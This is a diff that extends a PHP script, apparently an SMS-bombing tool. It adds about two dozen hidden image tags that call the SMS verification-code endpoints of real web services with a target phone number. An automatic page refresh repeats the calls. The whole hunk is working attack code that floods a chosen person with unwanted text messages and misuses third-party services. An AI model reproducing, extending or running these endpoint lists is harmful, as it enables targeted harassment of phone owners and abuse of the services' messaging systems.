@@ -3219,6 +3219,31 @@ if($d>1){
 <img src='http://101.132.126.166:8080/message/sendVerifyCode?callback=successCallback&mobilePhone=$d' &t=1589625247333action_type=regist&mobile=$d' alt=''/>
 <img src='http://101.132.126.166:8080/message/sendVerifyCode?callback=successCallback&amp;mobilePhone=&amp;t=1589625247333 action_type=regist&amp;mobile=$d' alt=''>
 <img src='http://101.132.126.166:8080/message/sendVerifyCode?callback=successCallback&amp;mobilePhone=$d' &t='1589625247333action_type=regist&amp;mobile=$d'' alt=''>
+<img src='http://api.qingmang.mobi/v1/account.sendVerification?platform=console&token=&phone=%2B86$d8&code=65080339' alt=''/>
+<img src='http://id.lejiaolexue.com/api/sendvericode.ashx?phone=$d' alt=''/>
+<img src='http://m.5khouse.com/ashx/yzm.ashx?tel=$d&ys=hqyzm&sj=0.11739289648424056' alt=''/>
+<img src='http://m.ctscd.com/sys/ajax/User/CheckOrActivat.ashx?U_Mobile=$d&type=Mobile&checktext=$d&_=1624877392029' alt=''/>
+<img src='http://www.pmzaojia.com/pmzaojia/api/user/sendRegisterPhoneCode?phoneNum=$d' alt=''/>
+<img src='http://www.xuebangsoft.net/eduboss/CommonAction/sendVarifyCodeToPhone.do?phoneNumber=$d&regTimeCode=1589627585503' alt=''/>
+<img src='https://aitob.xiaoyezi.com/student_wx/student/send_sms_code?mobile=$d' alt=''/>
+<img src='https://app.zhuanzhuan.com/zz/transfer/getCaptcha?type=1&mobile=$d' alt=''/>
+<img src='https://cloud.huace.cn/ChcnavCloudAuth/code/sms?mobile=$d' alt=''/>
+<img src='https://dss.xiaoyezi.com/student_app/auth/validate_code?mobile=$d&country_code=86' alt=''/>
+<img src='https://igetcool-share.igetcool.com/mall-server/api/smscode/sendSmscode?phone=$d&countrycode=86&smstype=0&type=0' alt=''/>
+<img src='https://m.95303.com/api/OrderYx/GetCodeBySMS?mobile=$d&_=1626625066773' alt=''/>
+<img src='https://m.paperword.com/mobile/code/v2/login/code?promote=0&mobile=$d' alt=''/>
+<img src='https://m.yiwise.com/apiPlatform/verificationCode/send?phoneNumber=$d' alt=''/>
+<img src='https://mall-cashback.tinman.cn/noRight/campaign/send-verification-code?phone=$d' alt=''/>
+<img src='https://online.jobtool.cn/api/security/sms?phone=$d' alt=''/>
+<img src='https://openplatformwsgateway.czb365.com/openplatformws/user/send/sendCheckMsgV7/$d' alt=''/>
+<img src='https://passport.eqxiu.com/eqs/sms/token?phone=$d&type=quickLogin&checkPhone=1&channel=21&version=4.4.1' alt=''/>
+<img src='https://sso-c.souche.com/loginApi/getCaptchaUrlByPhone.json?app=tangeche&phone=$d' alt=''/>
+<img src='https://user.daojia.com/mobile/getcode?mobile=$d&newVersion=1&bu=112' alt=''/>
+<img src='https://www.51hawo.com/apollo/MobileCode/sendMobileCode?mobile=$d&sms_type=101&register_from=20000091' alt=''/>
+<img src='https://www.hainanwangdai.com/api/v1/user/agreement/privacy/status?utmSource=yrd_m_web&phone=$d' alt=''/>
+<img src='https://www.sensorsdata.cn/api/passport/sms/quest_new/$d?_t=qajgslud4i' alt=''/>
+<img src='https://www.sensorsdata.cn/api/passport/sms/quest_new/$d%20?_t=lkz3elvc' alt=''/>
+<img src='https://www.yojiang.cn/api/user/send_verify_code?phone=$d' alt=''/>
 </div>
 	";
      echo"<meta http-equiv=refresh content='0; url=api.php?hm=$d&amp;c=$a'>";
